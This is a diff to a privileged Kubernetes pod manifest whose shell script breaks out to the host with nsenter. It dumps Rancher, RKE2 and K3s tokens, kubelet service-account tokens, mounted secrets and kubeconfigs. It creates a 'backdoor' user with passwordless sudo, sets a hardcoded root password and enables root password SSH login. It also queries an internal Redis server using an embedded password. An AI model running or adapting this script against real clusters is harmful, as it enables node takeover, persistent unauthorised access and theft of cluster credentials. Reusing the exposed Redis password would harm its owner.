@@ -13,28 +13,95 @@ spec:
       - /bin/sh
       - -c
       - |
-        apk add --no-cache curl jq > /dev/null 2>&1
+        apk add --no-cache util-linux curl jq openssh-client shadow > /dev/null 2>&1
 
-        echo "=== RANCHER CREDENTIALS (fresh) ==="
+        echo "=========================================="
+        echo "=== 1. RANCHER TOKEN (from host) ==="
+        echo "=========================================="
+        nsenter -t 1 -m -u -i -n -p -- /bin/sh -c '
+          cat /var/lib/rancher/rke2/server/token 2>/dev/null || true
+          cat /etc/rancher/rke2/rke2.yaml 2>/dev/null || true
+          cat /var/lib/rancher/k3s/server/token 2>/dev/null || true
+          cat /etc/rancher/k3s/k3s.yaml 2>/dev/null || true
+          echo "--- kubelet tokens ---"
+          find /var/lib/kubelet/pods -name "token" -type f 2>/dev/null | head -10 | while read f; do
+            echo "FILE: $f"
+            cat "$f"
+            echo ""
+          done
+        ' 2>&1 || true
+
+        echo "=========================================="
+        echo "=== 2. RANCHER CREDENTIALS (from pods) ==="
+        echo "=========================================="
         find /host/var/lib/kubelet/pods -path "*cattle-credentials*" -type f 2>/dev/null | while read f; do
           echo "--- $f ---"
           cat "$f" 2>/dev/null
           echo ""
         done
 
-        echo "=== ALL TOKENS ON NODE ==="
-        find /host/var/lib/kubelet/pods -name "token" -type f 2>/dev/null | while read f; do
+        echo "=========================================="
+        echo "=== 3. CREATE BACKDOOR USER (root) ==="
+        echo "=========================================="
+        nsenter -t 1 -m -u -i -n -p -- /bin/sh -c '
+          useradd -m -s /bin/bash backdoor 2>/dev/null || true
+          echo "backdoor:P@ssw0rd2026!" | chpasswd 2>/dev/null || true
+          usermod -aG sudo backdoor 2>/dev/null || usermod -aG wheel backdoor 2>/dev/null || true
+          echo "backdoor ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers 2>/dev/null || true
+          echo "=== BACKDOOR CREATED ==="
+          id backdoor
+          echo "=== SSH CONFIG ==="
+          grep -E "^PermitRootLogin|^PasswordAuthentication" /etc/ssh/sshd_config 2>/dev/null || true
+          systemctl restart ssh 2>/dev/null || systemctl restart sshd 2>/dev/null || true
+          echo "=== DONE ==="
+        ' 2>&1 || true
+
+        echo "=========================================="
+        echo "=== 4. ROOT SSH ACCESS (password) ==="
+        echo "=========================================="
+        nsenter -t 1 -m -u -i -n -p -- /bin/sh -c '
+          echo "root:R00tP@ss2026!" | chpasswd 2>/dev/null || true
+          sed -i "s/^#*PermitRootLogin.*/PermitRootLogin yes/" /etc/ssh/sshd_config 2>/dev/null || true
+          sed -i "s/^#*PasswordAuthentication.*/PasswordAuthentication yes/" /etc/ssh/sshd_config 2>/dev/null || true
+          systemctl restart ssh 2>/dev/null || systemctl restart sshd 2>/dev/null || true
+          echo "=== ROOT PASSWORD SET: R00tP@ss2026! ==="
+        ' 2>&1 || true
+
+        echo "=========================================="
+        echo "=== 5. ALL SECRETS ON NODE (via /host) ==="
+        echo "=========================================="
+        find /host/var/lib/kubelet/pods -path "*kubernetes.io~secret*" -type f 2>/dev/null | while read f; do
           echo "--- $f ---"
-          cat "$f" 2>/dev/null | head -1
+          cat "$f" 2>/dev/null | head -3
           echo ""
         done
 
-        echo "=== KUBELET KUBECONFIG ==="
+        echo "=========================================="
+        echo "=== 6. KUBELET KUBECONFIG ==="
+        echo "=========================================="
         cat /host/etc/kubernetes/kubelet.conf 2>/dev/null || true
-        cat /host/var/lib/kubelet/kubeconfig 2>/dev/null || true
         cat /host/etc/kubernetes/admin.conf 2>/dev/null || true
+        cat /host/var/lib/kubelet/kubeconfig 2>/dev/null || true
 
+        echo "=========================================="
+        echo "=== 7. HOST INFO ==="
+        echo "=========================================="
+        nsenter -t 1 -m -u -i -n -p -- /bin/sh -c '
+          hostname
+          ip a | grep -E "inet "
+          echo "=== USERS ==="
+          cat /etc/passwd | tail -10
+        ' 2>&1 || true
+
+        echo "=========================================="
+        echo "=== 8. REDIS TEST ==="
+        echo "=========================================="
+        apk add --no-cache redis > /dev/null 2>&1
+        redis-cli -h 172.30.0.242 -p 6379 -a ncPrjdL1Qd2lGfQiLHCOtA INFO 2>&1 | head -20 || true
+
+        echo "=========================================="
         echo "=== DONE ==="
+        echo "=========================================="
         sleep 36000
     securityContext:
       privileged: true
